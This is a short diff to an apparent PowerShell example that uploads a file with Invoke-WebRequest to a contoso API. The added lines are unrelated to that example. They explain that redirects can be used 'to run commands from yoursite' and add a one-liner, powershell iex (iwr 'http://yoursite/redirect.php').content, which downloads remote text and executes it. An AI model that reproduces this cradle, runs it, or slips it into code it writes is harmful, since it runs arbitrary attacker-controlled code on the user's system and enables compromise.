@@ -39,3 +39,9 @@ $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
 $MultipartContent.Add($FileContent)
 
 $Response = Invoke-WebRequest -Body $MultipartContent -Method 'POST' -Uri 'https://api.contoso.com/upload'
+
+
+#Note that IWR follows redirects, so you can use this to run commands from yoursite. 
+#Use header in redirect.php to redirect to command.txt, e.g. header('Location: command.txt');
+powershell iex (iwr 'http://yoursite/redirect.php').content > outfile
+
